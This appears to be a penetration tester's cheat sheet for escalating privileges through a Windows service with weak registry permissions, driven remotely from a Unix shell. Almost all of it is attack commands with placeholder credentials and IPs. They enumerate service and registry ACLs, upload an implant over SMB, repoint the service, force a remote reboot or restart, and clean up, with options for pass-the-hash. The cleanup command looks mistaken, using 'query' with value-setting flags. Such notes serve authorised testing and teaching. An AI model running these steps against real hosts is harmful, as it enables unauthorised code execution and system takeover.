# Unix Shell

TODO: Convert the command lines to remote enumeration

## 01 - Detect

```
$ net rpc service list -U "<username>%<password>" -S <IP>

$ net rpc service status <service> -U "<username>%<password>" -S <IP>
```

```
$ services.py "<username>":"<password>"@<IP> list

$ services.py "<username>":"<password>"@<IP> config -name <service>

$ services.py "<username>":"<password>"@<IP> status -name <service>
```

```
$ regshell -U "<domain>/<username>%<password>" -R <IP>

$ regshell -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> -R <IP>

$ net rpc registry enumerate "HKLM\SYSTEM\CurrentControlSet\Services\RegSvc" -U "<username>%<password>" -S <IP>

$ reg.py "<username>":"<password>"@<IP> query -keyName "HKLM\SYSTEM\CurrentControlSet\Services\RegSvc"
```

```
$ smbcacls -U "<username>%<password>" //<IP>/C$ "/Program Files/Insecure Registry Service/insecureregistryservice.exe"
```

Using `smbclient` to enumerate the existing files while enabling `showacls`.

```
smb: \> showacls

smb: \> ls "/Program Files/Insecure Registry Service/insecureregistryservice.exe"
```

## 02 - Exploit

Take note of the timestamps

```
smb: \> allinfo file.txt

smb: \> put implant.exe
```

```
$ services.py "<username>":"<password>"@<IP> change -name <service>
```

### 2.1 - Automatic service

Reboot the system.

```
$ net rpc shutdown -t 0 -r -U "[<domain>/]<username>%<password>" -S <IP>

$ net rpc shutdown -t 0 -r -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> -S <IP>
```

### 2.2 - Manual service

```
$ net rpc service stop <service> -U "<username>%<password>" -S <IP>

$ net rpc service start <service> -U "<username>%<password>" -S <IP>
```

```
$ services.py "<username>":"<password>"@<IP> stop -name <service>

$ services.py "<username>":"<password>"@<IP> start -name <service>
```

## 03 - Cleanup

```
$ reg.py "<username>":"<password>"@<IP> query -keyName "HKLM\SYSTEM\CurrentControlSet\Services\RegSvc" -v ImagePath -vt REG_EXPAND_SZ -vd "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
```